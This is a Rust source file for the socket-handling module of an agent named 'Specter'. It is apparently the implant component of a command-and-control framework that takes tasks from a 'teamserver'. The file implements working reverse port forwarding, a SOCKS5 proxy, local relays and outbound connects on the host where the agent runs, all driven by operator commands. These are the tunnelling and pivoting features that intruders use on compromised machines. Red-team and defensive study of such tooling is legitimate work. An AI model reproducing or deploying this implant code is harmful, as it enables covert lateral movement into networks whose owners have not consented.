//! `SocketState` struct and all dispatch/polling methods.

use std::collections::HashMap;
use std::io::{ErrorKind, Read};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};

use red_cell_common::demon::{DemonCommand, DemonSocketCommand, DemonSocketType};
use tracing::{info, warn};

use crate::dispatch::Response;

use super::socket_io::{
    SOCKS_METHOD_NO_AUTH, SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
    SOCKS_REPLY_COMMAND_NOT_SUPPORTED, SOCKS_REPLY_GENERAL_FAILURE, SOCKS_REPLY_SUCCEEDED,
    SOCKS_VERSION, SocksRequestError, connect_ipv4_target, connect_socks_target,
    encode_port_forward_add, encode_rportfwd_remove, encode_socket_clear, encode_socket_close,
    encode_socket_connect, encode_socket_open, encode_socket_read_failure,
    encode_socket_read_success, encode_socket_write_failure, encode_socks_proxy_add,
    encode_socks_proxy_clear, encode_socks_proxy_remove, encode_u32, parse_bytes_le, parse_u32_le,
    pump_stream, raw_socket_error, read_available, send_socks_reply, try_parse_socks_greeting,
    try_parse_socks_request, write_all_nonblocking,
};

// ─── State structs ──────────────────────────────────────────────────────────

/// All socket-related state for the Specter agent.
#[derive(Debug, Default)]
pub struct SocketState {
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    socks_proxies: HashMap<u32, SocksProxy>,
    sockets: HashMap<u32, ManagedSocket>,
    local_relays: HashMap<u32, LocalRelayConnection>,
    socks_clients: HashMap<u32, SocksClient>,
    pending_responses: Vec<PendingSocketResponse>,
}

/// A pending response to be sent back to the teamserver.
#[derive(Debug, Clone)]
struct PendingSocketResponse {
    request_id: u32,
    payload: Vec<u8>,
}

#[derive(Debug)]
struct ReversePortForward {
    listener: TcpListener,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReversePortForwardMode {
    Teamserver,
    Local,
}

#[derive(Debug)]
struct SocksProxy {
    listener: TcpListener,
    bind_addr: u32,
    bind_port: u32,
}

#[derive(Debug)]
struct ManagedSocket {
    stream: TcpStream,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct LocalRelayConnection {
    left: TcpStream,
    right: TcpStream,
    parent_id: u32,
}

#[derive(Debug)]
struct SocksClient {
    stream: TcpStream,
    server_id: u32,
    state: SocksClientState,
}

#[derive(Debug)]
enum SocksClientState {
    Greeting { buffer: Vec<u8> },
    Request { buffer: Vec<u8> },
    Relay { target: TcpStream },
}

// ─── Error type ─────────────────────────────────────────────────────────────

/// Errors that can occur during socket operations.
#[derive(Debug, thiserror::Error)]
pub enum SocketError {
    /// A parse error occurred reading the task payload.
    #[error("socket parse error: {0}")]
    Parse(&'static str),

    /// An I/O error occurred on a socket operation.
    #[error("socket I/O error: {0}")]
    Io(String),
}

// ─── SocketState implementation ─────────────────────────────────────────────

impl SocketState {
    /// Create a new empty socket state.
    pub fn new() -> Self {
        Self::default()
    }

    /// Handle an incoming `CommandSocket` task from the teamserver.
    ///
    /// Parses the subcommand and dispatches to the appropriate handler.
    /// Some subcommands (like `Connect`) require async I/O, so this method
    /// is async.
    pub async fn handle_command(
        &mut self,
        request_id: u32,
        payload: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let subcommand_raw = parse_u32_le(payload, &mut offset)?;
        let subcommand = DemonSocketCommand::try_from(subcommand_raw)
            .map_err(|_| SocketError::Parse("unknown socket subcommand"))?;

        let rest = &payload[offset..];

        match subcommand {
            DemonSocketCommand::ReversePortForwardAdd => {
                self.handle_rportfwd_add(request_id, rest, ReversePortForwardMode::Teamserver)?;
            }
            DemonSocketCommand::ReversePortForwardAddLocal => {
                self.handle_rportfwd_add(request_id, rest, ReversePortForwardMode::Local)?;
            }
            DemonSocketCommand::ReversePortForwardList => {
                self.handle_rportfwd_list(request_id);
            }
            DemonSocketCommand::ReversePortForwardClear => {
                self.handle_rportfwd_clear(request_id);
            }
            DemonSocketCommand::ReversePortForwardRemove => {
                self.handle_rportfwd_remove(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyAdd => {
                self.handle_socks_proxy_add(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyList => {
                self.handle_socks_proxy_list(request_id);
            }
            DemonSocketCommand::SocksProxyRemove => {
                self.handle_socks_proxy_remove(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyClear => {
                self.handle_socks_proxy_clear(request_id);
            }
            DemonSocketCommand::Open => {
                warn!("socket open is a callback-only path — ignoring");
            }
            DemonSocketCommand::Read => {
                self.handle_socket_read(request_id, rest)?;
            }
            DemonSocketCommand::Write => {
                self.handle_socket_write(request_id, rest)?;
            }
            DemonSocketCommand::Close => {
                self.handle_socket_close(rest)?;
            }
            DemonSocketCommand::Connect => {
                self.handle_socket_connect(request_id, rest).await?;
            }
        }

        Ok(())
    }

    /// Poll all active sockets, listeners, and relays for pending I/O.
    ///
    /// Must be called periodically from the agent run loop. Returns any
    /// responses that need to be sent to the teamserver.
    pub async fn poll(&mut self) -> Result<(), SocketError> {
        self.accept_reverse_port_forward_clients().await?;
        self.accept_socks_proxy_clients()?;
        self.poll_sockets()?;
        self.poll_local_relays();
        self.poll_socks_clients().await?;
        Ok(())
    }

    /// Drain all pending responses queued during `handle_command()` and `poll()`.
    pub fn drain_responses(&mut self) -> Vec<Response> {
        self.pending_responses
            .drain(..)
            .map(|r| Response {
                command_id: u32::from(DemonCommand::CommandSocket),
                request_id: r.request_id,
                payload: r.payload,
            })
            .collect()
    }

    /// Returns `true` if there are active sockets, listeners, or relays that
    /// need periodic polling.
    pub fn has_active_connections(&self) -> bool {
        !self.reverse_port_forwards.is_empty()
            || !self.socks_proxies.is_empty()
            || !self.sockets.is_empty()
            || !self.local_relays.is_empty()
            || !self.socks_clients.is_empty()
    }

    // ─── Reverse port forward handlers ──────────────────────────────────────

    fn handle_rportfwd_add(
        &mut self,
        request_id: u32,
        rest: &[u8],
        mode: ReversePortForwardMode,
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;
        let forward_addr = parse_u32_le(rest, &mut offset)?;
        let forward_port = parse_u32_le(rest, &mut offset)?;

        let command = match mode {
            ReversePortForwardMode::Teamserver => DemonSocketCommand::ReversePortForwardAdd,
            ReversePortForwardMode::Local => DemonSocketCommand::ReversePortForwardAddLocal,
        };

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_port_forward_add(
                            command,
                            false,
                            0,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(
                    listener_id,
                    bind_addr, bound_port, forward_addr, forward_port, "rportfwd added"
                );
                self.reverse_port_forwards.insert(
                    listener_id,
                    ReversePortForward {
                        listener,
                        mode,
                        bind_addr,
                        bind_port: bound_port,
                        forward_addr,
                        forward_port,
                    },
                );
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        true,
                        listener_id,
                        bind_addr,
                        bound_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind rportfwd listener");
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        false,
                        0,
                        bind_addr,
                        bind_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
        }

        Ok(())
    }

    fn handle_rportfwd_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
        for (socket_id, listener) in &self.reverse_port_forwards {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(listener.bind_addr));
            payload.extend_from_slice(&encode_u32(listener.bind_port));
            payload.extend_from_slice(&encode_u32(listener.forward_addr));
            payload.extend_from_slice(&encode_u32(listener.forward_port));
        }
        self.queue_response(request_id, payload);
    }

    fn handle_rportfwd_clear(&mut self, request_id: u32) {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        for listener_id in listener_ids {
            self.remove_reverse_port_forward(listener_id);
        }
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(id, s)| (s.socket_type == DemonSocketType::Client).then_some(*id))
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }
        self.queue_response(request_id, encode_socket_clear(true));
    }

    fn handle_rportfwd_remove(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.reverse_port_forwards.contains_key(&socket_id) {
            let callbacks_before = self.pending_responses.len();
            self.remove_reverse_port_forward(socket_id);
            // Overwrite the request_id on the callback generated by remove_reverse_port_forward
            if let Some(resp) = self.pending_responses.get_mut(callbacks_before) {
                resp.request_id = request_id;
            }
        }
        Ok(())
    }

    // ─── SOCKS proxy handlers ───────────────────────────────────────────────

    fn handle_socks_proxy_add(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set socks listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(listener_id, bind_addr, bound_port, "socks proxy added");
                self.socks_proxies
                    .insert(listener_id, SocksProxy { listener, bind_addr, bind_port: bound_port });
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind socks proxy");
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                );
            }
        }

        Ok(())
    }

    fn handle_socks_proxy_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
        for (socket_id, proxy) in &self.socks_proxies {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(proxy.bind_addr));
            payload.extend_from_slice(&encode_u32(proxy.bind_port));
        }
        self.queue_response(request_id, payload);
    }

    fn handle_socks_proxy_remove(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.socks_proxies.remove(&socket_id).is_some() {
            let client_ids: Vec<u32> = self
                .socks_clients
                .iter()
                .filter_map(|(id, c)| (c.server_id == socket_id).then_some(*id))
                .collect();
            for client_id in client_ids {
                self.socks_clients.remove(&client_id);
            }
            self.queue_response(request_id, encode_socks_proxy_remove(socket_id));
        }
        Ok(())
    }

    fn handle_socks_proxy_clear(&mut self, request_id: u32) {
        self.socks_proxies.clear();
        self.socks_clients.clear();
        self.queue_response(request_id, encode_socks_proxy_clear(true));
    }

    // ─── Socket I/O handlers ────────────────────────────────────────────────

    fn handle_socket_read(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let socket_type_raw = parse_u32_le(rest, &mut offset)?;
        let socket_type = DemonSocketType::try_from(socket_type_raw)
            .map_err(|_| SocketError::Parse("unknown socket type"))?;
        let success = parse_u32_le(rest, &mut offset)? != 0;

        if success {
            let data = parse_bytes_le(rest, &mut offset)?;
            self.write_to_socket(request_id, socket_id, socket_type, &data)?;
        } else {
            let error_code = parse_u32_le(rest, &mut offset)?;
            warn!(socket_id, error_code, "socket read failed (from server)");
        }

        Ok(())
    }

    fn handle_socket_write(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let data = parse_bytes_le(rest, &mut offset)?;

        let mut write_failure = None;
        if let Some(socket) = self.sockets.get_mut(&socket_id) {
            if let Err(error) = write_all_nonblocking(&mut socket.stream, &data) {
                write_failure = Some((socket.socket_type, raw_socket_error(&error)));
            }
        }
        if let Some((socket_type, error_code)) = write_failure {
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn handle_socket_close(&mut self, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        self.remove_socket(socket_id);
        Ok(())
    }

    async fn handle_socket_connect(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;

        // atyp is a single byte
        if rest.len() <= offset {
            return Err(SocketError::Parse("buffer too short for atyp"));
        }
        let atyp = rest[offset];
        offset += 1;

        let host = parse_bytes_le(rest, &mut offset)?;

        // port is i16 LE
        if rest.len() < offset + 2 {
            return Err(SocketError::Parse("buffer too short for port"));
        }
        let port_bytes: [u8; 2] = rest[offset..offset + 2]
            .try_into()
            .map_err(|_| SocketError::Parse("port conversion failed"))?;
        let port = u16::from_le_bytes(port_bytes);

        match connect_socks_target(atyp, &host, port).await {
            Ok(stream) => {
                self.sockets.insert(
                    socket_id,
                    ManagedSocket {
                        stream,
                        socket_type: DemonSocketType::ReverseProxy,
                        bind_addr: 0,
                        bind_port: u32::from(port),
                        forward_addr: 0,
                        forward_port: 0,
                    },
                );
                self.queue_response(request_id, encode_socket_connect(true, socket_id, 0));
            }
            Err(error_code) => {
                self.queue_response(
                    request_id,
                    encode_socket_connect(false, socket_id, error_code),
                );
            }
        }

        Ok(())
    }

    // ─── Internal helpers ───────────────────────────────────────────────────

    fn write_to_socket(
        &mut self,
        request_id: u32,
        socket_id: u32,
        expected_type: DemonSocketType,
        data: &[u8],
    ) -> Result<(), SocketError> {
        let Some(socket) = self.sockets.get_mut(&socket_id) else {
            warn!(socket_id, "socket not found for write");
            return Ok(());
        };

        let socket_type = socket.socket_type;
        if socket_type != expected_type {
            warn!(socket_id, ?socket_type, ?expected_type, "socket type mismatch");
            return Ok(());
        }

        if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
            let error_code = raw_socket_error(&error);
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    pub(super) fn queue_response(&mut self, request_id: u32, payload: Vec<u8>) {
        self.pending_responses.push(PendingSocketResponse { request_id, payload });
    }

    pub(super) fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
            || self.socks_proxies.contains_key(&socket_id)
            || self.local_relays.contains_key(&socket_id)
            || self.socks_clients.contains_key(&socket_id)
        {
            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_response(0, payload);
    }

    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
            return;
        };

        // Remove all client sockets associated with this listener.
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(client_id, socket)| {
                (socket.socket_type == DemonSocketType::Client
                    && socket.bind_addr == listener.bind_addr
                    && socket.bind_port == listener.bind_port
                    && socket.forward_addr == listener.forward_addr
                    && socket.forward_port == listener.forward_port)
                    .then_some(*client_id)
            })
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }

        // Remove all local relays associated with this listener.
        let relay_ids: Vec<u32> = self
            .local_relays
            .iter()
            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
            .collect();
        for relay_id in relay_ids {
            self.local_relays.remove(&relay_id);
        }

        self.queue_response(
            0,
            encode_rportfwd_remove(
                socket_id,
                DemonSocketType::ReversePortForward,
                listener.bind_addr,
                listener.bind_port,
                listener.forward_addr,
                listener.forward_port,
            ),
        );
    }

    // ─── Polling helpers ────────────────────────────────────────────────────

    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), SocketError> {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream.set_nonblocking(true).map_err(|e| SocketError::Io(e.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.mode,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                    Err(e) => return Err(SocketError::Io(e.to_string())),
                }
            }
        }

        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
            accepted
        {
            match mode {
                ReversePortForwardMode::Teamserver => {
                    let socket_id = self.allocate_socket_id();
                    self.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::Client,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    self.queue_response(
                        0,
                        encode_socket_open(
                            socket_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );

                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        self.remove_socket(socket_id);
                    }
                }
                ReversePortForwardMode::Local => {
                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        continue;
                    }
                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
                    {
                        self.local_relays.insert(
                            self.allocate_socket_id(),
                            LocalRelayConnection {
                                left: stream,
                                right: target,
                                parent_id: listener_id,
                            },
                        );
                    }
                }
            }
        }

        Ok(())
    }

    fn accept_socks_proxy_clients(&mut self) -> Result<(), SocketError> {
        let server_ids: Vec<u32> = self.socks_proxies.keys().copied().collect();
        let mut accepted = Vec::new();

        for server_id in server_ids {
            let Some(proxy) = self.socks_proxies.get(&server_id) else {
                continue;
            };

            loop {
                match proxy.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream.set_nonblocking(true).map_err(|e| SocketError::Io(e.to_string()))?;
                        accepted.push((server_id, stream));
                    }
                    Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                    Err(e) => return Err(SocketError::Io(e.to_string())),
                }
            }
        }

        for (server_id, stream) in accepted {
            if !self.socks_proxies.contains_key(&server_id) {
                continue;
            }
            self.socks_clients.insert(
                self.allocate_socket_id(),
                SocksClient {
                    stream,
                    server_id,
                    state: SocksClientState::Greeting { buffer: Vec::new() },
                },
            );
        }

        Ok(())
    }

    fn poll_sockets(&mut self) -> Result<(), SocketError> {
        let socket_ids: Vec<u32> = self.sockets.keys().copied().collect();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                        Err(e) => {
                            read_failure = Some(encode_socket_read_failure(
                                socket_id,
                                socket.socket_type,
                                raw_socket_error(&e),
                            ));
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    match encode_socket_read_success(socket_id, socket.socket_type, &data) {
                        Ok(payload) => read_success = Some(payload),
                        Err(e) => {
                            warn!(socket_id, error = %e, "failed to encode socket read success");
                            removals.push(socket_id);
                        }
                    }
                }
            }

            if let Some(payload) = read_failure {
                self.queue_response(0, payload);
            }
            if let Some(payload) = read_success {
                self.queue_response(0, payload);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn poll_local_relays(&mut self) {
        let relay_ids: Vec<u32> = self.local_relays.keys().copied().collect();
        let mut removals = Vec::new();

        for relay_id in relay_ids {
            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
                continue;
            };

            let left_result = pump_stream(&mut relay.left, &mut relay.right);
            let right_result = pump_stream(&mut relay.right, &mut relay.left);
            if left_result || right_result {
                removals.push(relay_id);
            }
        }

        for relay_id in removals {
            self.local_relays.remove(&relay_id);
        }
    }

    async fn poll_socks_clients(&mut self) -> Result<(), SocketError> {
        let client_ids: Vec<u32> = self.socks_clients.keys().copied().collect();
        let mut removals = Vec::new();

        for client_id in client_ids {
            let Some(client) = self.socks_clients.get_mut(&client_id) else {
                continue;
            };

            match &mut client.state {
                SocksClientState::Greeting { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_greeting(buffer) {
                        None => {}
                        Some(Ok(consumed)) => {
                            let remainder = buffer.split_off(consumed);
                            if write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
                            )
                            .is_err()
                            {
                                removals.push(client_id);
                                continue;
                            }
                            client.state = SocksClientState::Request { buffer: remainder };
                        }
                        Some(Err(method)) => {
                            let _ =
                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Request { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_request(buffer) {
                        None => {}
                        Some(Ok((consumed, request))) => {
                            let remainder = buffer.split_off(consumed);
                            match connect_socks_target(request.atyp, &request.address, request.port)
                                .await
                            {
                                Ok(mut target) => {
                                    if send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_SUCCEEDED,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )
                                    .is_err()
                                    {
                                        removals.push(client_id);
                                        continue;
                                    }
                                    if !remainder.is_empty()
                                        && write_all_nonblocking(&mut target, &remainder).is_err()
                                    {
                                        removals.push(client_id);
                                        continue;
                                    }
                                    client.state = SocksClientState::Relay { target };
                                }
                                Err(_error_code) => {
                                    let _ = send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_GENERAL_FAILURE,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    );
                                    removals.push(client_id);
                                }
                            }
                        }
                        Some(Err(error)) => {
                            let reply = match error {
                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
                                SocksRequestError::CommandNotSupported => {
                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
                                }
                                SocksRequestError::AddressTypeNotSupported => {
                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
                                }
                            };
                            let _ = write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
                            );
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Relay { target } => {
                    let client_failed = pump_stream(&mut client.stream, target);
                    let target_failed = pump_stream(target, &mut client.stream);
                    if client_failed || target_failed {
                        removals.push(client_id);
                    }
                }
            }
        }

        for client_id in removals {
            self.socks_clients.remove(&client_id);
        }

        Ok(())
    }
}
